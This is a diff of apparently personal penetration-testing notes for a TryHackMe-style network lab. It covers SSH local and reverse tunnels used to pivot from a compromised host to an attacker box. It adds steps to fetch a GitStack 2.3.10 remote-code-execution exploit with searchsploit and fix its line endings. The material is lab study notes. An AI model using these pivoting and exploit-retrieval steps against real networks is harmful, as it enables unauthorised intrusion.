@@ -536,7 +536,7 @@ Creating a forward (local) SSH tunnel done on attacking box when we have SSH acc
 Eg.
 - We have access to SSH 172.16.0.5
 - Web server on 172.16.0.10
-- `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`
+- Attacking machine: `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`
 - This means we can access webserver `172.16.0.10` by visiting `localhost:8000` on a web browser through SSH tunnel from `172.16.0.5`
 
 2. Creating a proxy
@@ -602,14 +602,17 @@ sudo systemctl start ssh
 ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
 ```
 
-For the web server 172.16.0.10 and 172.16.0.5 shell'd server. With attacking box 172.16.0.20
+For example:
+- Web server 172.16.0.10 
+- Shell'd server 172.16.0.5 
+- Attacking box 172.16.0.20
 
+On the shell'd server
 ```
 ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
 ```
 
 On newer client the reverse proxy creation can be done with `-D`
-
 ```
 ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
 ```
@@ -1191,5 +1194,28 @@ Shellcodes: No Result
 
 <details>
   <summary>---</summary>
+
+Download the potential RCE found with searchsploit
+```
+kali@kali:~/thm/wreath$ searchsploit -m 43777
+  Exploit: GitStack 2.3.10 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/43777
+     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/kali/thm/wreath/43777.py
+```
+
+Exploit copied might have DOS line endings. We can use a tool to convert this if this is the case
+```
+dos2unix ./43777.py
+```
+or
+```
+sed -i 's/\r//' ./EDBID.py
+```
+
+
+
 
 </details>
